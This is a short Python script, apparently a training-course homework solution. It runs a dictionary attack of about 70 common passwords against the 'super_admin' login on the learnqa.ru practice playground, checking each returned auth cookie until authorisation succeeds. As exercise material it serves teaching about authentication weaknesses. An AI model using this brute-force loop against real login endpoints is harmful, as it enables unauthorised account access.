import requests

# Ниже представлен отфильтрованный список паролей без дублей.
pass_list = ["tpassword", "123456", "123456789", "12345678", "12345", "qwerty", "abc123", "football", "1234567",
             "monkey", "111111", "letmein", "1234", "1234567890", "dragon", "baseball",
             "sunshine", "iloveyou", "trustno1", "princess", "adobe123", "123123", "welcome", "login", "admin",
             "qwerty123", "solo", "1q2w3e4r", "master", "666666", "photoshop", "1qaz2wsx",
             "qwertyuiop", "ashley", "mustang", "121212", "starwars", "654321", "bailey", "access", "flower", "555555",
             "passw0rd", "shadow", "lovely", "654321", "7777777", "michael",
             "!@#$%^&*", "jesus", "password1", "superman", "hello", "charlie", "888888", "696969", "hottie", "freedom",
             "aa123456", "qazwsx", "ninja", "azerty", "loveme", "whatever", "donald",
             "batman", "zaq1zaq1", "Football", "000000", "123qwe"]

#Код по последовательному перебору паролей:
for i in pass_list:
    response2 = requests.post("https://playground.learnqa.ru/ajax/api/get_secret_password_homework", data={"login": "super_admin", "password": f"{i}"})
    print(response2.request.body)
    cookie = response2.cookies.get("auth_cookie")
    cookie_for_request = {"auth_cookie": f"{cookie}"}
    print(cookie_for_request)
    response_for_check = requests.post("https://playground.learnqa.ru/ajax/api/check_auth_cookie", cookies=cookie_for_request)
    print(response_for_check.text)
    print("====================================================================================================================")
    if response_for_check.text == "You are authorized":
        print(f" ========> Корректный пароль подобран! Пароль = '{i}' <==============")
        break
